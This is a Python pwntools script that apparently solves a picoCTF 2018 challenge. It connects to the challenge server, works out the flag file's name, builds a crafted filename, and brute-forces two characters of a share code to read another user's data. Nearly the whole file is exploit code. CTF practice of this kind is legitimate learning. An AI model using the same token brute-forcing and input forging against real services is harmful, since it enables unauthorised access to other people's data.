from pwn import *
import re

ctr = remote("2018shell.picoctf.com", 36150)

ctr.recvuntil("Please choose: ")
log.info("choosing")

ctr.sendline("i")

info = ctr.recvuntil("Please choose: ")
log.info("getting flag_file")
log.info(info)

flag_file = re.search('flag.*', info).group(0)

log.info(flag_file)

ctr.sendline("n")

ctr.recvuntil("Name of file? ")

payload = ""
payload += flag_file.split("_")[0]
payload += "+"
payload += flag_file.split("_")[1].split(".")[0]

log.info(payload)

ctr.sendline(payload)

log.info("getting data")
ctr.sendline("hi")
info = ctr.recvuntil("Please choose: ")

code = info.split("\n")[1]

log.info(code)

b64 = 'abcdefghijklmnopqrstuvwxyz/+ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in b64:	
	for j in b64:
		ctr.sendline("e")

		ctr.recvuntil("Share code? ")

		payload = ""
		payload += code[:5]
		payload += i
		payload += j
		payload += code[7:]
	
		log.info(payload)

		ctr.sendline(payload)

		info = ctr.recvuntil("Please choose: ")
		log.info(info)
		if info.find("not") == -1 and info.find("hi") == -1:
			log.info(info)
			ctr.close()
ctr.close()
